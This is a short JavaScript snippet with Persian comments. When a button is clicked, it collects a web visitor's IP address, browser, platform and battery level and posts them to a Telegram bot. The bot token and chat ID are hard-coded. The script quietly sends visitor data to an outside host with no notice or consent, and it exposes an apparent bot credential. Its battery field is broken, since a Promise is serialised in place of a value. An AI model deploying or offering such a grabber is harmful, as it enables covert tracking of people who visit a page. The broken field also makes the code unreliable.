let tg = {
  token: "6583320212:AAGci8mHu1_ctX1OIQd2rlvqHM-11FIGsZ4", // توکن ربات خود را از @BotFather دریافت کنید
  chat_id: "1663788795" // شناسه چت کاربری که می‌خواهید به آن پیام ارسال کنید
}

function sendInfo() {
  let info = {
    ip: '', // آدرس IP
    browser: navigator.userAgent, // نوع مرورگر
    os: navigator.platform, // سیستم عامل
    device: navigator.userAgent, // مشخصات دستگاه
    battery: navigator.getBattery().then(function(battery) { return battery.level * 100; }) // درصد شارژ باتری
  };

  // دریافت آدرس IP
  fetch('https://api.ipify.org?format=json')
    .then(response => response.json())
    .then(data => info.ip = data.ip)
    .then(() => {
      // ارسال اطلاعات به ربات تلگرام
      const url = `https://api.telegram.org/bot${tg.token}/sendMessage`; // URL درخواست
      const obj = {
        chat_id: tg.chat_id, // شناسه چت تلگرام
        text: JSON.stringify(info) // متن برای ارسال
      };

      const xht = new XMLHttpRequest();
      xht.open("POST", url, true);
      xht.setRequestHeader("Content-type", "application/json; charset=UTF-8");
      xht.send(JSON.stringify(obj));
    });
}

// فراخوانی تابع sendInfo هنگام کلیک روی یک دکمه
document.getElementById('info-button').addEventListener('click', sendInfo);
